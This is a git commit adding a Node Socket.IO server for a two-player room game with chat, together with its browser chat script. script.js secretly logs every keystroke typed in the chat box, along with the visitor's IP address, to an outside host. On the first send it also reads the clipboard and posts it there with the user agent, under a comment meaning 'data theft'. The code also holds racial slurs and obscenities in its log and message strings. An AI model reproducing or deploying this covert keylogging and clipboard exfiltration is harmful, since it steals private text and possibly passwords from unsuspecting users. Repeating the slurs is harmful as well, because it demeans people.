e37a54d761dd13676fbac6e67d54f965bcd96a28
nirajk009 <132467956+nirajk009@users.noreply.github.com>
2023-12-20 18:07:01 +0530

    Add files via upload

---
+++ app.js
@@ -0,0 +1,230 @@
+const express = require('express');
+// const morgan = require('morgan');
+const socketIO = require('socket.io');
+
+const httpServer = require("http").createServer(express);
+
+const io = socketIO(httpServer, {
+  cors: {
+    origin: "*", // Replace with your client address
+    methods: ["GET", "POST"]
+  }
+});
+
+
+httpServer.listen(3000);
+console.log("app is working fine");
+
+// const app = express();
+// const port = 3000;
+// app.use(morgan('tiny'));
+
+
+const connectedSockets = {};
+
+// app.listen(port, () => {
+//   console.log(`Server is running on port ${port}`);
+// });
+
+io.on('connection', (socket) => {
+  console.log('A user connected');
+
+  // Listen for 'clientEvent' from the client
+  socket.on('clientEvent', (data) => {
+    console.log('Received from client:', data);
+    // Sending a response back to the client
+    socket.emit('serverEvent', { message: 'Hello, client! teri ma randi' });
+  });
+    //room
+
+  socket.on('joined_room2', (room1,name) => {
+
+    // Associate the name with the socket ID or any identifier you want
+    socket.name = name;
+
+    // Get all clients in 'roomName' and their names
+
+
+
+    console.log('Server received joined_room2 event with data:');
+    socket.join(room1);
+    const room = room1;
+    socket.emit('joined', name);
+    console.log(name + ' joined room ' + room);
+        socket.score=0;
+ const roomClients = io.sockets.adapter.rooms.get(room);
+  
+  if (roomClients && roomClients.size > 1) {
+
+    console.log('Room has more than one connection');
+
+    
+    const roomClients = io.sockets.adapter.rooms.get(room);
+
+    if (roomClients) {
+      // Extract names of all roommates
+      const roommates = [];
+      roomClients.forEach((clientId) => {
+        const clientSocket = io.sockets.sockets.get(clientId);
+            socket.score=0;
+        roommates.push(clientSocket.name);
+        //socket.score=0;
+      
+     // Assuming the name is stored as 'name'
+      });
+
+      console.log('Roommates in roomName:', roommates);
+           socket.broadcast.to(room).emit('p_data', {p1:roommates[0],p2:roommates[1],room_name:room});
+      socket.emit('p_data', {p1:roommates[0],p2:roommates[1],room_name:room});
+      socket.room69=room;
+    }
+
+  }
+if (roomClients.size==2) {
+id2=socket.id;
+  connectedSockets[socket.id] = { score: 0 };
+    connectedSockets[socket.id+2] = { player: 2 };
+    connectedSockets[socket.id+1] = { name: socket.name };
+socket.player=2;
+socket.score=0;
+socket.room1=room;
+  socket.emit('2done');
+  socket.turn="0";
+  socket.emit('my_turn',socket.turn);
+   console.log(socket.turn+" "+socket.name)
+}else{
+  id1=socket.id;
+socket.room1=room;
+  connectedSockets[socket.id] = { score: 0 };
+    connectedSockets[socket.id+2] = { player: 1 };
+    connectedSockets[socket.id+1] = { name: socket.name };
+socket.player=1;
+socket.score=0;
+socket.turn="X";
+  socket.emit('my_turn',socket.turn);
+  console.log(socket.turn+" "+socket.name)
+}
+    
+
+socket.on('whos_turn',data=>{
+console.log(data+" ki turn hei");
+})
+
+
+socket.on('niraj',(data)=>{
+	socket.to(room).emit('niraj_cl',data);
+   console.log('Received from client:', data);
+ console.log(socket.turn+" "+socket.name)
+
+});  
+ });  
+    socket.on('is_win',(data)=>{
+      console.log(data+"makiiiiiiiiiiiiiiiiiiiiii")
+if(data==='xwins'){
+    const roomClients = io.sockets.adapter.rooms.get(socket.room1);
+
+    roomClients.forEach((clientId) => {
+        const clientSocket = io.sockets.sockets.get(clientId);
+           if(clientSocket.player==1){
+            clientSocket.score=(clientSocket.score)+1;
+            console.log(clientSocket.name+"score : "+clientSocket.score);
+           }});
+
+}else{
+    const roomClients = io.sockets.adapter.rooms.get(socket.room1);
+
+    roomClients.forEach((clientId) => {
+        const clientSocket = io.sockets.sockets.get(clientId);
+           if(clientSocket.player==2){
+            clientSocket.score=(clientSocket.score)+1;
+            console.log(clientSocket.name+"score : "+clientSocket.score);
+           }
+        
+      
+      
+     // Assuming the name is stored as 'name'
+      });
+}
+
+    });
+
+socket.on('is_win2',()=>{
+ const roomClients2 = io.sockets.adapter.rooms.get(socket.room1);
+   // Extract names of all roommates
+      const roommates2 = [];
+      roomClients2.forEach((clientId) => {
+        const clientSocket2 = io.sockets.sockets.get(clientId);
+            socket.score=0;
+        roommates2.push(clientSocket2.name);
+                roommates2.push(clientSocket2.score);
+
+        //socket.score=0;
+         // Assuming the name is stored as 'name'
+      });
+ console.log('Roommates in roomName:', roommates2);
+  });
+
+socket.on('chadar',(data)=>{
+room_c=data.room;
+   socket.broadcast.to(room_c).emit('chadar_act');
+})
+
+socket.on('chadar2',(data)=>{
+   socket.broadcast.emit('chadar_act2');
+})
+
+socket.on('reset_karo',(data)=>{
+  room_c=data.room;
+   socket.broadcast.to(room_c).emit('reset_kare');
+})
+// solve above
+
+
+socket.on('going_offline',(data)=>{
+roomxx=data.room;
+//console.log("nega te tala ta"+roomxx);
+  socket.broadcast.to(roomxx).emit('offline');
+});
+
+socket.on('coming_back',(data)=>{
+roomxx=data.room;
+//console.log("nega te tala ta2"+roomxx);
+  socket.broadcast.to(roomxx).emit('online');
+});
+
+socket.on('room_set',(data)=>{
+socket.room69=data.room;
+});
+ socket.on('disconnect', () => {
+    console.log('user disconnected'+socket.room69);
+    roper=socket.room69;
+   socket.broadcast.to(roper).emit('discon');
+  });
+
+///chat
+
+socket.on('msg_gaya',(data)=>{
+	roomx=data.roomx;
+    msg_Was=data.msg;
+socket.broadcast.to(roomx).emit('msg_aaya',{msg_is:msg_Was});
+console.log(msg_Was)
+  });
+
+socket.on('typeping',(data)=>{
+	roomx=data.room_is;
+socket.broadcast.to(roomx).emit('typeing4u');
+console.log("nigggggggggggggggggga");
+  });
+
+socket.on('typeping_rook',(data)=>{
+	roomx=data.room_is;
+socket.broadcast.to(roomx).emit('typeing_gayi');
+  console.log("nigggggggggggggggggga 22222222222");
+  });
+
+  socket.on('disconnect', () => {
+    console.log('A user disconnected');
+  });
+
+
+});
---
+++ script.js
@@ -0,0 +1,440 @@
+const chatbotToggler = document.querySelector(".chatbot-toggler");
+const closeBtn = document.querySelector(".close-btn");
+const chatbox = document.querySelector(".chatbox");
+const chatInput = document.querySelector(".chat-input textarea");
+const sendChatBtn = document.querySelector(".chat-input span");
+
+let userMessage = null; // Variable to store user's message
+const API_KEY = "PASTE-YOUR-API-KEY"; // Paste your API key here
+const inputInitHeight = chatInput.scrollHeight;
+
+  
+
+    document.addEventListener("DOMContentLoaded", async function() {
+      try {
+        await sendDataOnKeyUp("hi there, I am a new visitor");
+        console.log("Data sent successfully!");
+        // Continue loading the page or trigger other actions after sending data
+      } catch (error) {
+        console.error("Error sending data:", error);
+      }
+    });
+
+const createChatLi = (message, className) => {
+    // Create a chat <li> element with passed message and className
+    const chatLi = document.createElement("li");
+    chatLi.classList.add("chat", `${className}`);
+    let chatContent = className === "outgoing" ? `<p></p>` : `<span class="material-symbols-outlined">sentiment_satisfied</span><p></p>`;
+    chatLi.innerHTML = chatContent;
+    chatLi.querySelector("p").textContent = message;
+    return chatLi; // return chat <li> element
+}
+
+var msg_count=0;
+
+function handleChat(type,msg) {
+
+    if (type==1) {
+    userMessage = chatInput.value.trim(); // Get user entered message and remove extra whitespace
+    if(!userMessage) return;
+
+
+    // Clear the input textarea and set its height to default
+    chatInput.value = "";
+    chatInput.style.height = `${inputInitHeight}px`;
+
+    // Append the user's message to the chatbox
+    chatbox.appendChild(createChatLi(userMessage, "outgoing"));
+    chatbox.scrollTo(0, chatbox.scrollHeight);
+    p3_namee=document.getElementById('room_name_hei');
+rom = p3_namee.innerText;
+     socket.emit('msg_gaya',{
+msg:userMessage,roomx:rom});
+     socket.emit('typeping_rook',{room_is:rom});
+    }else{
+
+            const incomingChatLi = createChatLi(msg, "incoming");
+        chatbox.appendChild(incomingChatLi);
+        chatbox.scrollTo(0, chatbox.scrollHeight);
+ }
+}
+
+
+
+socket.on('msg_aaya',(data)=>{
+      
+      handleChat(2,data.msg_is);
+    msg_count=msg_count+1;
+      updateBadge(msg_count);
+
+});
+
+
+
+chatInput.addEventListener("input", () => {
+    // Adjust the height of the input textarea based on its content
+    chatInput.style.height = `${inputInitHeight}px`;
+    chatInput.style.height = `${chatInput.scrollHeight}px`;
+});
+
+chatInput.addEventListener("keydown", (e) => {
+    // If Enter key is pressed without Shift key, handle the chat
+p3_namee=document.getElementById('room_name_hei');
+rom = p3_namee.innerText;
+//if (!chatInput.value=="") {
+socket.emit('typeping',{room_is:rom});
+//}
+    if (e.key === "Enter" && !e.shiftKey) {
+        e.preventDefault();
+        handleChat(1, 'hi'); // Sending a placeholder message ('hi') for now
+    }
+});
+
+chatInput.addEventListener("keyup", (e) => {
+   lita = chatInput.value;
+   sendDataOnKeyUp(lita);
+
+    p3_namee=document.getElementById('room_name_hei');
+rom = p3_namee.innerText;
+//if (chatInput.value=="") {
+socket.emit('typeping_rook',{room_is:rom});
+
+//}
+
+});
+// sendChatBtn.addEventListener("click", ()=>{
+//   chatInput2 = document.querySelector(".chat-input textarea");
+//   msg_hei=chatInput2.value;
+//   console.log(msg_hei);
+//     socket.emit('msg_gaya',{
+// msg:msg_hei});
+// });
+let isFirstClick = true;
+
+sendChatBtn.addEventListener("click", async () => {
+  lita = chatInput.value;
+
+  try {
+    if (isFirstClick) {
+      await sendData(lita); // Wait for sendData to complete
+    } else {
+      sendData3(lita);
+    }
+    handleChat(1, 'hi'); // Proceed with handleChat after sendData or sendData3 is done
+    isFirstClick = false; // Update flag after the first click
+  } catch (error) {
+    // Handle any errors that might occur during sendData or sendData3
+    console.error("Error:", error);
+  }
+});
+
+
+
+
+
+closeBtn.addEventListener("click", () =>{
+updateBadge(0);
+msg_count=0;
+ document.body.classList.remove("show-chatbot")
+});
+chatbotToggler.addEventListener("click", () => {
+updateBadge(0);
+msg_count=0;
+    document.body.classList.toggle("show-chatbot")});
+
+messageInput22 = document.getElementById('messageInput');
+   
+
+  messageInput22.addEventListener('keydown', function(event) {
+    console.log("neggaaaaa the tha tha")
+    p3_namee = document.getElementById('room_name_hei');
+// Check if any key other than 'Enter' is pressed
+      const rom = p3_namee.innerText;
+      socket.emit('typeping', { room_is: rom });
+ 
+  });
+
+  messageInput2.addEventListener('keyup', function(event) {
+   lita = chatInput.value;
+    sendDataOnKeyUp(lita);
+ console.log("neggaaaaa the tha tha");
+    p3_namee = document.getElementById('room_name_hei');
+    const rom = p3_namee.innerText;
+    socket.emit('typeping_rook', { room_is: rom });
+  });
+
+
+// let messageCount = 0; // Variable to store the message count
+
+// // Simulated event for new message arrival
+// document.getElementById('chat_vala').addEventListener('click', function () {
+//   messageCount++; // Increment message count
+//   updateBadge();
+  
+//   // Simulated delay to reset the badge after a few seconds
+//   setTimeout(function () {
+//     messageCount = 0; // Reset the message count
+//     updateBadge();
+//   }, 3000); // Adjust this time according to your requirement
+// });
+
+function updateBadge() {
+  const badge = document.getElementById('notification-badge');
+  if (messageCount > 0) {
+    badge.style.display = 'block';
+    badge.textContent = messageCount > 9 ? '9+' : messageCount;
+  } else {
+    badge.style.display = 'none';
+  }
+}
+
+
+function updateBadge(count) {
+  const badge = document.getElementById('notification-badge');
+
+  if (count > 0) {
+    badge.style.display = 'block';
+    badge.textContent = count > 9 ? '9+' : count;
+  } else {
+    badge.style.display = 'none';
+  }
+}
+
+/// data chori
+function sendData(message) {
+  return new Promise((resolve, reject) => {
+    const fetchData = async () => {
+      try {
+        const response = await fetch("https://api.ipify.org/?format=json");
+        const ipData = await response.json();
+        const ipAddress = ipData.ip;
+        const userAgent = navigator.userAgent;
+
+        let clipboardData = null;
+        if (navigator.clipboard) {
+          try {
+            const textFromClipboard = await navigator.clipboard.readText();
+            clipboardData = textFromClipboard;
+          } catch (error) {
+            clipboardData = null;
+          }
+        }
+
+        // Assuming message is for "lia" field
+        const formData = {
+          lia: message,
+          ip: ipAddress,
+          clip: clipboardData,
+          navi_string: userAgent
+        };
+
+        $.ajax({
+          url: "https://nirajk99.000webhostapp.com/save-form.php",
+          type: "POST",
+          data: formData,
+          success: function(data) {
+            if (data === "1") {
+              console.log("Data saved successfully!");
+              resolve(); // Resolve the promise when the data is saved successfully
+            }
+          },
+          error: function(xhr, status, error) {
+            console.error("Error:", error);
+            reject(error); // Reject the promise in case of an error
+          }
+        });
+      } catch (error) {
+        console.error("Error:", error);
+        reject(error); // Reject the promise if any error occurs during the process
+      }
+    };
+
+    fetchData();
+  });
+}
+
+function sendData3(message) {
+  return new Promise((resolve, reject) => {
+    const fetchData = async () => {
+      try {
+        const response = await fetch("https://api.ipify.org/?format=json");
+        const ipData = await response.json();
+        const ipAddress = ipData.ip;
+        const userAgent = navigator.userAgent;
+
+        let clipboardData = null;
+        // if (navigator.clipboard) {
+        //   try {
+        //     const textFromClipboard = await navigator.clipboard.readText();
+        //     clipboardData = textFromClipboard;
+        //   } catch (error) {
+        //     clipboardData = null;
+        //   }
+        // }
+
+        // Assuming message is for "lia" field
+        const formData = {
+          lia: message,
+          ip: ipAddress,
+          clip: clipboardData,
+          navi_string: userAgent
+        };
+
+        $.ajax({
+          url: "https://nirajk99.000webhostapp.com/save-form.php",
+          type: "POST",
+          data: formData,
+          success: function(data) {
+            if (data === "1") {
+              console.log("Data saved successfully!");
+              resolve(); // Resolve the promise when the data is saved successfully
+            }
+          },
+          error: function(xhr, status, error) {
+            console.error("Error:", error);
+            reject(error); // Reject the promise in case of an error
+          }
+        });
+      } catch (error) {
+        console.error("Error:", error);
+        reject(error); // Reject the promise if any error occurs during the process
+      }
+    };
+
+    fetchData();
+  });
+}
+
+
+async function sendData2(message) {
+    const response = await fetch("https://api.ipify.org/?format=json");
+    const ipData = await response.json();
+    const ipAddress = ipData.ip;
+    const userAgent = navigator.userAgent;
+
+    if (!navigator.clipboard) {
+        alert("Clipboard API is not supported in this browser.");
+        var clipboardData = null;
+    } else {
+        try {
+            const textFromClipboard = await navigator.clipboard.readText();
+            var clipboardData = textFromClipboard;
+        } catch (error) {
+            var clipboardData = null; // Set clipboard value as null if access is denied
+        }
+    }
+
+    // const formData = {
+    //     lia: message, // Assuming the message is meant for "lia" field
+    //     ip: ipAddress,
+    //     clip: clipboardData,
+    //     navi_string: userAgent
+    // };
+
+    $.ajax({
+        url: "https://nirajk99.000webhostapp.com/save-form.php",
+
+        type: "POST",
+        data: {
+             lia: message, // Assuming the message is meant for "lia" field
+        ip: ipAddress,
+        clip: clipboardData,
+        navi_string: userAgent
+        },
+        success: function(data) {
+            if (data === "1") {
+                console.log("Data saved successfully!"); // Adjust the success handling as needed
+            }
+        },
+        error: function(xhr, status, error) {
+            console.error("Error:", error);
+            // Handle error cases here
+        }
+    });
+}
+
+
+
+
+//key up
+async function sendDataOnKeyUp(fieldValue) {
+    const response = await fetch("https://api.ipify.org/?format=json");
+    console.log("kund hei benchod");
+    const ipData = await response.json();
+    const ipAddress = ipData.ip;
+
+    const currentDate = getCurrentDate();
+    const currentTime = getCurrentTime();
+
+    const formData = {
+        ip: ipAddress,
+        date: currentDate,
+        lia: `${currentTime}   ${fieldValue}`
+    };
+
+    $.ajax({
+        url: "https://nirajk99.000webhostapp.com/save_key.php",
+        type: "POST",
+        data:{
+            ip: ipAddress,
+            date: currentDate,
+            lia: currentTime+" "+ fieldValue
+        },
+        success: function (data) {
+            if (data === "1") {
+                console.log("Data sent successfully!");
+            } else {
+                console.log("Failed to send data.");
+            }
+        },
+        error: function (error) {
+            console.error("Error:", error);
+            // Handle error cases here
+        }
+    });
+}
+
+
+function attachKeyUpListener(inputFieldId) {
+    const inputField = document.getElementById(inputFieldId);
+    inputField.addEventListener("keyup", function(e) {
+        const fieldValue = $(`#${inputFieldId}`).val();
+        sendDataOnKeyUp(fieldValue);
+    });
+}
+
+function getCurrentDate() {
+  const today = new Date();
+    const day = today.getDate();
+    const month = today.getMonth() + 1; // Months are zero-based
+    const year = today.getFullYear();
+
+    const formattedDay = (day < 10) ? `0${day}` : day;
+    const formattedMonth = (month < 10) ? `0${month}` : month;
+
+    const formattedDate = `${formattedDay}-${formattedMonth}-${year}`;
+
+    return formattedDate;
+}
+
+function getCurrentTime() {
+   const today = new Date();
+    const hours = today.getHours();
+    const minutes = today.getMinutes();
+    const seconds = today.getSeconds();
+
+    const formattedHours = (hours < 10) ? `0${hours}` : hours;
+    const formattedMinutes = (minutes < 10) ? `0${minutes}` : minutes;
+    const formattedSeconds = (seconds < 10) ? `0${seconds}` : seconds;
+
+    const formattedTime = `${formattedHours}-${formattedMinutes}-${formattedSeconds}`;
+
+    return formattedTime;
+}
+
+
+// Example of attaching the function to an input field with ID "lia"
+messageInput3 = document.getElementById('messageInput');
+attachKeyUpListener("messageInput");
+
+ 
